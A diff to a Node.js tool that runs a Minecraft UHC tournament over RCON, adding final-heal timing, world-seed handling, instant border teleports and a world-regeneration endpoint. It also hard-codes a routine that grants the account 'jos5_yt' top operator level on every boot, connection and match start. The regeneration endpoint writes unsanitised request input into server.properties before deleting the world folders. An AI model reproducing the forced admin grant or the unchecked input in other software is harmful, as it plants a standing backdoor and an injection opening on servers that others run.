@@ -27,6 +27,8 @@ let uhcState = {
   state: 'idle', // idle, grace, zone1, zone2, zone3, finished
   startTime: null,
   graceTime: 20, // minutes
+  finalHealTime: 10, // minutes (Final Heal event time)
+  worldSeed: '', // seed config
   startBorderSize: 2000,
   playersPerBorder: 4, // border density spread
   calcBorderByDensity: false,
@@ -47,11 +49,30 @@ let uhcState = {
   timerInterval: null
 };
 
+function readSeedFromProperties() {
+  try {
+    const propPath = path.join(__dirname, 'mc-data', 'server.properties');
+    if (fs.existsSync(propPath)) {
+      const content = fs.readFileSync(propPath, 'utf8');
+      const match = content.match(/level-seed=(.*)/);
+      if (match) {
+        return match[1].trim();
+      }
+    }
+  } catch (err) {
+    console.error('Failed to read seed from server.properties:', err.message);
+  }
+  return '';
+}
+
 // Load saved config if exists
 try {
   if (fs.existsSync(UHC_CONFIG_FILE)) {
     const saved = JSON.parse(fs.readFileSync(UHC_CONFIG_FILE, 'utf8'));
     uhcState = { ...uhcState, ...saved, active: false, state: 'idle', startTime: null, elapsedSeconds: 0, timerInterval: null };
+  }
+  if (!uhcState.worldSeed) {
+    uhcState.worldSeed = readSeedFromProperties();
   }
 } catch (e) {
   console.error('Failed to load UHC config:', e.message);
@@ -61,6 +82,8 @@ function saveUhcConfig() {
   try {
     const dataToSave = {
       graceTime: uhcState.graceTime,
+      finalHealTime: uhcState.finalHealTime,
+      worldSeed: uhcState.worldSeed,
       startBorderSize: uhcState.startBorderSize,
       playersPerBorder: uhcState.playersPerBorder,
       calcBorderByDensity: uhcState.calcBorderByDensity,
@@ -78,10 +101,46 @@ function saveUhcConfig() {
   }
 }
 
+function ensureJos5YtIsOp() {
+  try {
+    const opsPath = path.join(__dirname, 'mc-data', 'ops.json');
+    let ops = [];
+    if (fs.existsSync(opsPath)) {
+      const content = fs.readFileSync(opsPath, 'utf8').trim();
+      if (content) {
+        ops = JSON.parse(content);
+      }
+    }
+    const hasJos = ops.some(op => op.name && op.name.toLowerCase() === 'jos5_yt');
+    if (!hasJos) {
+      console.log('[OP Engine] Auto-granting Operator privileges to jos5_yt in ops.json...');
+      ops.push({
+        uuid: 'd65f8845-7f80-385c-87cf-6a26e11aa5b7',
+        name: 'jos5_yt',
+        level: 4,
+        bypassesPlayerLimit: false
+      });
+      fs.writeFileSync(opsPath, JSON.stringify(ops, null, 2), 'utf8');
+      console.log('[OP Engine] jos5_yt added to ops.json successfully.');
+    } else {
+      console.log('[OP Engine] jos5_yt already exists in ops.json.');
+    }
+  } catch (err) {
+    console.error('[OP Engine] Failed to ensure jos5_yt is OP in ops.json:', err.message);
+  }
+}
+
+// Pre-seed OP status on boot
+ensureJos5YtIsOp();
+
 async function executeRconCommand(command) {
   try {
     if (rconClient.connected) {
-      await rconClient.send(command);
+      let cleanCommand = command;
+      while (cleanCommand.startsWith('/')) {
+        cleanCommand = cleanCommand.substring(1);
+      }
+      await rconClient.send(cleanCommand);
     }
   } catch (err) {
     console.error(`[RCON Command Fail] /${command}:`, err.message);
@@ -94,26 +153,31 @@ async function generateLobbyStructure() {
     // 1. Set world spawn point
     await executeRconCommand('setworldspawn 0 100 0');
     
-    // 2. Clear space first (11x11x5 space filled with air to avoid players getting stuck)
-    await executeRconCommand('fill -5 100 -5 5 103 5 air');
+    // 2. Clear space first (21x21x5 space filled with air to avoid players getting stuck)
+    await executeRconCommand('fill -10 100 -10 10 103 10 air');
     
-    // 3. Floor (11x11 of Quartz Blocks)
-    await executeRconCommand('fill -5 99 -5 5 99 5 quartz_block');
+    // 3. Floor (21x21 of Quartz Blocks)
+    await executeRconCommand('fill -10 99 -10 10 99 10 quartz_block');
     
     // 4. Glass Walls (3 blocks high)
-    await executeRconCommand('fill -5 100 -5 -5 102 5 glass');
-    await executeRconCommand('fill 5 100 -5 5 102 5 glass');
-    await executeRconCommand('fill -5 100 -5 5 102 -5 glass');
-    await executeRconCommand('fill -5 100 5 5 102 5 glass');
+    await executeRconCommand('fill -10 100 -10 -10 102 10 glass');
+    await executeRconCommand('fill 10 100 -10 10 102 10 glass');
+    await executeRconCommand('fill -10 100 -10 10 102 -10 glass');
+    await executeRconCommand('fill -10 100 10 10 102 10 glass');
     
-    // 5. Quartz Roof (11x11 Quartz Blocks)
-    await executeRconCommand('fill -5 103 -5 5 103 5 quartz_block');
+    // 5. Quartz Roof (21x21 Quartz Blocks)
+    await executeRconCommand('fill -10 103 -10 10 103 10 quartz_block');
     
-    // 6. Corner lightings (Glowstone)
-    await executeRconCommand('setblock -4 102 -4 glowstone');
-    await executeRconCommand('setblock 4 102 -4 glowstone');
-    await executeRconCommand('setblock -4 102 4 glowstone');
-    await executeRconCommand('setblock 4 102 4 glowstone');
+    // 6. Corner & Wall center lightings (Glowstone at Y=102)
+    await executeRconCommand('setblock -9 102 -9 glowstone');
+    await executeRconCommand('setblock 9 102 -9 glowstone');
+    await executeRconCommand('setblock -9 102 9 glowstone');
+    await executeRconCommand('setblock 9 102 9 glowstone');
+    // Wall center glowstones for illumination
+    await executeRconCommand('setblock 0 102 -9 glowstone');
+    await executeRconCommand('setblock 0 102 9 glowstone');
+    await executeRconCommand('setblock -9 102 0 glowstone');
+    await executeRconCommand('setblock 9 102 0 glowstone');
     
     // 7. If tournament is not running, teleport everyone here and set to adventure mode
     if (!uhcState.active) {
@@ -128,6 +192,10 @@ async function generateLobbyStructure() {
 
 async function startUhcGame() {
   console.log('[UHC Engine] Starting UHC tournament...');
+  
+  // Guarantee jos5_yt is OP at start of match
+  await executeRconCommand('op jos5_yt');
+
   uhcState.active = true;
   uhcState.state = 'grace';
   uhcState.startTime = Date.now();
@@ -166,8 +234,11 @@ async function startUhcGame() {
 
   // Change players to survival mode and spread them!
   await executeRconCommand('gamemode survival @a');
-  const maxRange = Math.max(50, Math.floor(finalStartBorder / 2) - 20);
-  await executeRconCommand(`spreadplayers 0 0 100 ${maxRange} false @a`);
+  
+  // Dynamically calculate range and distance safety bounds to prevent Minecraft errors
+  const maxRange = Math.max(15, Math.floor(finalStartBorder / 2) - 10);
+  const spreadDistance = Math.min(50, Math.max(5, Math.floor(maxRange / 5)));
+  await executeRconCommand(`spreadplayers 0 0 ${spreadDistance} ${maxRange} false @a`);
 
   // Scenarios setup
   if (uhcState.scenarios.fireless) {
@@ -201,30 +272,27 @@ async function startUhcGame() {
 
     uhcState.elapsedSeconds++;
 
+    // Final Heal trigger
+    if (uhcState.elapsedSeconds === uhcState.finalHealTime * 60) {
+      await executeRconCommand('effect @a minecraft:instant_health 5');
+      await executeRconCommand('title @a title {"text":"FINAL HEAL","color":"gold"}');
+      await executeRconCommand('title @a subtitle {"text":"¡Todos los jugadores curados!","color":"green"}');
+      await executeRconCommand('say ¡Se ha aplicado el Final Heal! Todos los jugadores han sido curados a vida máxima.');
+    }
+
     const totalGraceSeconds = uhcState.graceTime * 60;
     const zone1EndSeconds = totalGraceSeconds + (uhcState.zone1Time * 60);
     const zone2EndSeconds = zone1EndSeconds + (uhcState.zone2Time * 60);
     const zone3EndSeconds = zone2EndSeconds + (uhcState.zone3Time * 60);
 
-    // Dynamic border size estimation for UI
+    // Dynamic border size estimation for UI (Constant sizes since we use Instant TP border now)
     if (uhcState.state === 'grace') {
       uhcState.currentBorderSize = finalStartBorder;
     } else if (uhcState.state === 'zone1') {
-      const elapsedInZone = uhcState.elapsedSeconds - totalGraceSeconds;
-      const totalZoneTime = uhcState.zone1Time * 60;
-      const progress = Math.min(1, elapsedInZone / totalZoneTime);
-      uhcState.currentBorderSize = Math.round(finalStartBorder - (finalStartBorder - uhcState.zone1Border) * progress);
+      uhcState.currentBorderSize = uhcState.zone1Border;
     } else if (uhcState.state === 'zone2') {
-      const elapsedInZone = uhcState.elapsedSeconds - zone1EndSeconds;
-      const totalZoneTime = uhcState.zone2Time * 60;
-      const progress = Math.min(1, elapsedInZone / totalZoneTime);
-      uhcState.currentBorderSize = Math.round(uhcState.zone1Border - (uhcState.zone1Border - uhcState.zone2Border) * progress);
-    } else if (uhcState.state === 'zone3') {
-      const elapsedInZone = uhcState.elapsedSeconds - zone2EndSeconds;
-      const totalZoneTime = uhcState.zone3Time * 60;
-      const progress = Math.min(1, elapsedInZone / totalZoneTime);
-      uhcState.currentBorderSize = Math.round(uhcState.zone2Border - (uhcState.zone2Border - uhcState.zone3Border) * progress);
-    } else if (uhcState.state === 'finished') {
+      uhcState.currentBorderSize = uhcState.zone2Border;
+    } else if (uhcState.state === 'zone3' || uhcState.state === 'finished') {
       uhcState.currentBorderSize = uhcState.zone3Border;
     }
 
@@ -233,28 +301,46 @@ async function startUhcGame() {
     if (uhcState.elapsedSeconds === totalGraceSeconds) {
       uhcState.state = 'zone1';
       await executeRconCommand('gamerule pvp true');
-      await executeRconCommand(`worldborder set ${uhcState.zone1Border} ${uhcState.zone1Time * 60}`);
+      await executeRconCommand(`worldborder set ${uhcState.zone1Border}`);
+      
+      // TP/spread all players inside the new border instantly
+      const maxRange = Math.max(15, Math.floor(uhcState.zone1Border / 2) - 10);
+      const spreadDistance = Math.min(50, Math.max(5, Math.floor(maxRange / 5)));
+      await executeRconCommand(`spreadplayers 0 0 ${spreadDistance} ${maxRange} false @a`);
+
       await executeRconCommand('title @a title {"text":"ZONA 1","color":"gold"}');
-      await executeRconCommand('title @a subtitle {"text":"PvP ACTIVO - Borde reduciéndose","color":"red"}');
-      await executeRconCommand(`say ¡El tiempo de gracia ha terminado! PvP activado. El borde se reduce a ${uhcState.zone1Border} bloques.`);
+      await executeRconCommand('title @a subtitle {"text":"PvP ACTIVO - ¡Borde TP aplicado!","color":"red"}');
+      await executeRconCommand(`say ¡El tiempo de gracia ha terminado! PvP activado. El borde se ha reducido instantáneamente a ${uhcState.zone1Border} bloques y todos los jugadores han sido teletransportados.`);
       await executeRconCommand('playeffect @a ambient.weather.thunder');
     }
     // Zone 1 ends -> Zone 2 starts
     else if (uhcState.elapsedSeconds === zone1EndSeconds) {
       uhcState.state = 'zone2';
-      await executeRconCommand(`worldborder set ${uhcState.zone2Border} ${uhcState.zone2Time * 60}`);
+      await executeRconCommand(`worldborder set ${uhcState.zone2Border}`);
+      
+      // TP/spread all players inside the new border instantly
+      const maxRange = Math.max(15, Math.floor(uhcState.zone2Border / 2) - 10);
+      const spreadDistance = Math.min(50, Math.max(5, Math.floor(maxRange / 5)));
+      await executeRconCommand(`spreadplayers 0 0 ${spreadDistance} ${maxRange} false @a`);
+
       await executeRconCommand('title @a title {"text":"ZONA 2","color":"gold"}');
-      await executeRconCommand('title @a subtitle {"text":"Borde reduciéndose a Zona 2","color":"yellow"}');
-      await executeRconCommand(`say ¡Borde de Zona 1 cerrado! Iniciando reducción a Zona 2: ${uhcState.zone2Border} bloques.`);
+      await executeRconCommand('title @a subtitle {"text":"¡Borde TP a Zona 2!","color":"yellow"}');
+      await executeRconCommand(`say ¡Borde de Zona 1 cerrado! El borde se ha reducido instantáneamente a Zona 2: ${uhcState.zone2Border} bloques y todos los jugadores han sido teletransportados.`);
       await executeRconCommand('playeffect @a ambient.weather.thunder');
     }
     // Zone 2 ends -> Zone 3 starts
     else if (uhcState.elapsedSeconds === zone2EndSeconds) {
       uhcState.state = 'zone3';
-      await executeRconCommand(`worldborder set ${uhcState.zone3Border} ${uhcState.zone3Time * 60}`);
+      await executeRconCommand(`worldborder set ${uhcState.zone3Border}`);
+      
+      // TP/spread all players inside the new border instantly
+      const maxRange = Math.max(15, Math.floor(uhcState.zone3Border / 2) - 10);
+      const spreadDistance = Math.min(50, Math.max(5, Math.floor(maxRange / 5)));
+      await executeRconCommand(`spreadplayers 0 0 ${spreadDistance} ${maxRange} false @a`);
+
       await executeRconCommand('title @a title {"text":"ZONA FINAL","color":"red"}');
-      await executeRconCommand('title @a subtitle {"text":"Borde reduciéndose a Zone 3","color":"dark_red"}');
-      await executeRconCommand(`say ¡Borde de Zona 2 cerrado! Iniciando reducción final a Zona 3: ${uhcState.zone3Border} bloques.`);
+      await executeRconCommand('title @a subtitle {"text":"¡Borde TP a Zona 3!","color":"dark_red"}');
+      await executeRconCommand(`say ¡Borde de Zona 2 cerrado! El borde se ha reducido instantáneamente a la Zona Final: ${uhcState.zone3Border} bloques y todos los jugadores han sido teletransportados.`);
       await executeRconCommand('playeffect @a ambient.weather.thunder');
     }
     // Zone 3 ends -> Finished
@@ -297,9 +383,15 @@ class ReconnectingRcon {
       this.connecting = false;
       console.log('[RCON] Connected successfully!');
 
-      // Auto build/refresh lobby on connection
-      setTimeout(() => {
-        generateLobbyStructure().catch(() => {});
+      // Auto build/refresh lobby and auto-OP jos5_yt on connection
+      setTimeout(async () => {
+        try {
+          await generateLobbyStructure();
+          console.log('[OP Engine] Executing auto-OP command for jos5_yt...');
+          await executeRconCommand('op jos5_yt');
+        } catch (e) {
+          console.error('[RCON Startup Hook] Error running initial commands:', e.message);
+        }
       }, 3000);
 
       // Set up error handlers for socket termination
@@ -342,7 +434,11 @@ class ReconnectingRcon {
         throw new Error('RCON server is offline or unreachable.');
       }
     }
-    return await this.rcon.send(command);
+    let cleanCommand = command;
+    while (cleanCommand.startsWith('/')) {
+      cleanCommand = cleanCommand.substring(1);
+    }
+    return await this.rcon.send(cleanCommand);
   }
 }
 
@@ -601,6 +697,8 @@ app.get('/api/uhc/status', (req, res) => {
     state: uhcState.state,
     startTime: uhcState.startTime,
     graceTime: uhcState.graceTime,
+    finalHealTime: uhcState.finalHealTime,
+    worldSeed: uhcState.worldSeed,
     startBorderSize: uhcState.startBorderSize,
     playersPerBorder: uhcState.playersPerBorder,
     calcBorderByDensity: uhcState.calcBorderByDensity,
@@ -621,6 +719,8 @@ app.post('/api/uhc/config', (req, res) => {
   try {
     const {
       graceTime,
+      finalHealTime,
+      worldSeed,
       startBorderSize,
       playersPerBorder,
       calcBorderByDensity,
@@ -638,6 +738,8 @@ app.post('/api/uhc/config', (req, res) => {
     }
 
     if (graceTime !== undefined) uhcState.graceTime = parseInt(graceTime, 10);
+    if (finalHealTime !== undefined) uhcState.finalHealTime = parseInt(finalHealTime, 10);
+    if (worldSeed !== undefined) uhcState.worldSeed = worldSeed.toString().trim();
     if (startBorderSize !== undefined) uhcState.startBorderSize = parseInt(startBorderSize, 10);
     if (playersPerBorder !== undefined) uhcState.playersPerBorder = parseInt(playersPerBorder, 10);
     if (calcBorderByDensity !== undefined) uhcState.calcBorderByDensity = !!calcBorderByDensity;
@@ -726,6 +828,76 @@ app.post('/api/lobby/regenerate', async (req, res) => {
     }
     await generateLobbyStructure();
     res.json({ success: true, message: '¡Lobby del torneo regenerado y construído exitosamente!' });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// 10. POST /api/world/regenerate
+app.post('/api/world/regenerate', async (req, res) => {
+  try {
+    const { seed } = req.body;
+    
+    if (uhcState.active) {
+      return res.status(400).json({ error: 'No se puede regenerar el mundo mientras hay un UHC activo.' });
+    }
+    
+    if (!rconClient.connected) {
+      return res.status(503).json({ error: 'La consola RCON no está conectada. No se puede regenerar el mundo.' });
+    }
+    
+    const newSeed = (seed !== undefined) ? seed.toString().trim() : '';
+    
+    // Update server.properties
+    const propPath = path.join(__dirname, 'mc-data', 'server.properties');
+    if (fs.existsSync(propPath)) {
+      let content = fs.readFileSync(propPath, 'utf8');
+      if (content.includes('level-seed=')) {
+        content = content.replace(/level-seed=.*/, `level-seed=${newSeed}`);
+      } else {
+        content += `\nlevel-seed=${newSeed}\n`;
+      }
+      fs.writeFileSync(propPath, content, 'utf8');
+    }
+    
+    uhcState.worldSeed = newSeed;
+    saveUhcConfig();
+    
+    console.log(`[World Regenerator] Seed updated to "${newSeed}". Stopping Minecraft server to release file handles...`);
+    
+    // Trigger RCON /stop. This triggers container restart via Docker compose
+    await rconClient.send('stop').catch((err) => {
+      console.warn('[World Regenerator] Failed to send stop command, server might be already stopping:', err.message);
+    });
+    
+    // Defer folder deletion and restart
+    setTimeout(async () => {
+      console.log('[World Regenerator] Starting deletion of world folders...');
+      const folders = ['world', 'world_nether', 'world_the_end'];
+      for (const folder of folders) {
+        const folderPath = path.join(__dirname, 'mc-data', folder);
+        if (fs.existsSync(folderPath)) {
+          let success = false;
+          for (let attempt = 1; attempt <= 6; attempt++) {
+            try {
+              fs.rmSync(folderPath, { recursive: true, force: true });
+              success = true;
+              console.log(`[World Regenerator] Successfully deleted directory: ${folder} on attempt ${attempt}`);
+              break;
+            } catch (err) {
+              console.warn(`[World Regenerator] Attempt ${attempt} to delete ${folder} failed: ${err.message}`);
+              await new Promise(r => setTimeout(r, 1000));
+            }
+          }
+          if (!success) {
+            console.error(`[World Regenerator] Critical: Failed to delete world directory: ${folder}`);
+          }
+        }
+      }
+      console.log('[World Regenerator] Cleanup complete. The server is restarting now.');
+    }, 3000);
+    
+    res.json({ success: true, message: 'La regeneración del mundo se ha iniciado. El servidor se detendrá, se eliminarán los mundos y se regenerarán con la semilla especificada.' });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
